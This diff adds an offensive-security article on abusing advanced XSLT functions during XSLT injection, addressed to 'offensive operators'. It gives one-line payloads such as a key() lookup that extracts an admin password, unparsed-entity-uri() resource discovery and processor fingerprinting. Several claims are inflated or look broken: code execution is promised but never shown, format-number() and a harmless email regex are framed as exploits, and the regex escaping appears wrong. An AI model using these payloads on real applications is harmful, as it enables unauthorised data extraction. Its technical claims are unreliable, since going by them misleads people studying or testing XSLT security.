@@ -1,0 +1,126 @@
+---
+title: Mastering Advanced XSLT Functions for Exploitation
+description: Explore advanced XSLT functions for code execution and data manipulation
+  in injections.
+keywords:
+- advanced XSLT functions
+- XSLT injection
+- data manipulation
+- generate-id abuse
+- format-number exploitation
+- XSLT 2.0
+- XSLT 3.0
+- function exploitation
+- code execution
+---
+
+# Advanced XSLT Functions
+
+## Context
+
+The objective of this article is to enable offensive operators to exploit advanced XSLT functions for code execution, data manipulation, and environment discovery during XSLT injection attacks. This guide assumes the reader is familiar with XSLT processing logic, XML structure and parsing, XSLT stylesheet syntax, and basic XSLT injection techniques.
+
+## Theory
+
+### Advanced XSLT Functionality and Attack Surface
+
+Advanced XSLT functions extend the capabilities for manipulation, computation, and interaction within XSLT processors. Attackers can leverage these functions to bypass restrictions, extract sensitive data, or trigger unintended behaviors in web applications. The complexity of these functions increases the attack surface by enabling logic operations, iteration processes, and access to external resources.
+
+### Key XSLT Functions for Exploitation
+
+**generate-id():** This function produces unique identifiers for nodes, which can be exploited for logic manipulation and data extraction within XSLT documents.
+
+**format-number():** Used for formatting numbers, this function can be misused for type confusion or to shape output formats in unexpected ways.
+
+**key():** Facilitates indexed lookups, making it easier to extract targeted data from XML documents using predefined keys.
+
+**current():** This function references the current node in the XSLT processing context, enabling the crafting of context-aware payloads that adapt to different processing states.
+
+**unparsed-entity-uri():** Allows access to external entities, potentially leading to the leakage of internal resources or sensitive system data.
+
+### XSLT 2.0/3.0 and Extended Functionality
+
+XSLT 2.0 and 3.0 introduce additional functions such as regex, date, math, and advanced string operations. These newer functions enable more complex data processing and allow attackers to perform deeper probing of the processing environment. However, support for these advanced features varies across different XSLT engines, affecting the reliability of exploits.
+
+### Security Implications of Advanced XSLT Functions
+
+Applications might implicitly trust the output of XSLT functions, leading to potential logic flaws or data leakages. By chaining advanced functions, attackers can bypass simple input validation or output encoding mechanisms, potentially leading to severe security breaches.
+
+## Practice
+
+### Abusing generate-id() for Data Extraction and Logic Manipulation
+
+- **Payload:**
+
+  ```xml
+  <xsl:value-of select="generate-id(/*)"/>
+  ```
+
+  This payload extracts a unique ID for the root node, which is useful for fingerprinting or branching logic based on the identity of specific nodes.
+
+### Leveraging format-number() for Output Shaping and Type Confusion
+
+- **Payload:**
+
+  ```xml
+  <xsl:value-of select="format-number(123456789, '###,###')"/>
+  ```
+
+  Employ this payload to format numbers in a controlled manner, potentially bypassing numeric validation by changing the expected number format.
+
+### Exploiting key() for Indexed Data Extraction
+
+- **Payload:**
+
+  ```xml
+  <xsl:key name="users" match="user" use="@id"/> 
+  <xsl:value-of select="key('users', 'admin')/password"/>
+  ```
+
+  This payload defines a key and uses it to extract the password of a user with the id 'admin', facilitating targeted data extraction.
+
+### Using current() for Context-Aware Payloads
+
+- **Payload:**
+
+  ```xml
+  <xsl:value-of select="name(current())"/>
+  ```
+
+  This payload returns the name of the current node, which helps in developing context-sensitive exploits that dynamically adapt to the processing environment.
+
+### Abusing unparsed-entity-uri() for Internal Resource Discovery
+
+- **Payload:**
+
+  ```xml
+  <xsl:value-of select="unparsed-entity-uri('secret')"/>
+  ```
+
+  This payload attempts to resolve and reveal the URI of an internal entity named 'secret', potentially exposing internal resource configurations.
+
+### Exploiting XSLT 2.0/3.0 Regex and String Functions
+
+- **Payload:**
+
+  ```xml
+  <xsl:value-of select="matches('admin@example.com', '[a-z]+@[a-z]+\\.com')"/>
+  ```
+
+  Using regex functions, this payload checks email patterns, allowing for advanced filtering and validation within XSLT.
+
+### Using Math and Date Functions for Logic and Timing Attacks (XSLT 2.0/3.0)
+
+- **Payload:**
+
+  ```xml
+  <xsl:value-of select="current-dateTime()"/>
+  ```
+
+  Extract the current date and time from the XSLT processor environment, revealing environment details or enabling time-based logic attacks.
+
+## Tools
+
+- **xsltproc**  
+- **Saxon**  
+- **libxslt**  
